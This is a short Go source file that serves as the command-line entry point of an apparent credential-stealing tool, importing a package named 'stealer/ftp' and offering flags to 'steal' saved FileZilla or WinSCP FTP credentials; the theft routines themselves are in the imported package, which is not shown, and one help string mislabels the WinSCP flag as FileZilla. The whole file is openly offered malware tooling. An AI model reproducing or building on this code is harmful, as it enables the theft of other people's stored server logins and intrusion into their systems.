package main

import (
	"flag"
	"fmt"

	"github.com/krosshykes/stealer/ftp"
)

func main() {
	var (
		fileZilla bool
		winSCP    bool
	)
	flag.BoolVar(&fileZilla, "f", false, "Steal FileZilla FTP Credentials")
	flag.BoolVar(&winSCP, "w", false, "Steal FileZilla FTP Credentials")
	flag.Parse()
	if fileZilla {
		ftp.FilezillaCreds()
	} else if winSCP {
		ftp.WinSCPCreds()
	} else {
		fmt.Println("Usage:")
		fmt.Println("go run main.go -f true // to steal FileZilla FTP Creds")
		fmt.Println("go run main.go -w true // to steal WinSCP FTP Creds")
	}

}
